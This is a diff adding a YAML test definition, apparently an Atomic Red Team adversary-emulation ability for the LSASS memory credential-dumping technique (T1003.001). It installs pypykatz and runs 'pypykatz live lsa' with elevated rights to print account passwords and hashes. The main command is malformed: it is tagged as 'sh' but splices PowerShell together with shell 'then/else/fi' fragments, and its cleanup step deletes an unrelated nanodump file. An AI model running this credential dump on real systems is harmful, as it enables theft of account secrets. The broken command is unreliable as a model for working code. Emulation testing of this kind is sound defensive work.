@@ -1,0 +1,94 @@
+- id: c37bc535-5c62-4195-9cc3-0517673171d8
+  name: LSASS read with pypykatz
+  description: 'Parses secrets hidden in the LSASS process with python. Similar to
+    mimikatz''s sekurlsa::
+
+
+    Python 3 must be installed, use the get_prereq_command''s to meet the prerequisites
+    for this test.
+
+
+    Successful execution of this test will display multiple usernames and passwords/hashes
+    to the screen.
+
+
+    Will create a Python virtual environment within the External Payloads folder that
+    can be deleted manually post test execution.'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else
+          { exit 1 }; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction ignore -Force | Out-Null; invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"; Start-Process
+          -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList
+          "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait; fi; if (Test-Path
+          -Path "PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001") { exit 0
+          } else { exit 1 }; then : ; else py -m venv "PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001";
+          fi; if (Get-Command "PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz"
+          -errorAction SilentlyContinue) { exit 0 } else { exit 1 }; then : ; else
+          & "PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001\Scripts\pip.exe"
+          install --no-cache-dir pypykatz 2>&1 | Out-Null; fi; "PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz"
+          live lsa'
+        cleanup: del "%temp%\nanodump.dmp" > nul 2> nul
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1003.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      venv_path:
+        description: Path to the folder for the tactics venv
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001
+    dependencies:
+    - description: 'Computer must have python 3 installed
+
+        '
+      prereq_command: 'if (Get-Command py -errorAction SilentlyContinue) { exit 0
+        } else { exit 1 }
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction ignore -Force | Out-Null
+
+        invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"
+        -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+
+        Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+        -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+
+        '
+    - description: 'Computer must have venv configured at #{venv_path}
+
+        '
+      prereq_command: 'if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit
+        1 }
+
+        '
+      get_prereq_command: 'py -m venv "#{venv_path}"
+
+        '
+    - description: "pypykatz must be installed \n"
+      prereq_command: 'if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction
+        SilentlyContinue) { exit 0 } else { exit 1 }
+
+        '
+      get_prereq_command: '& "#{venv_path}\Scripts\pip.exe" install --no-cache-dir
+        pypykatz 2>&1 | Out-Null
+
+        '
+    technique_created: '2020-02-11T18:41:44.783Z'
+    atomic_guid: c37bc535-5c62-4195-9cc3-0517673171d8
+    import_timestamp: '2025-06-24T11:15:06.567633Z'
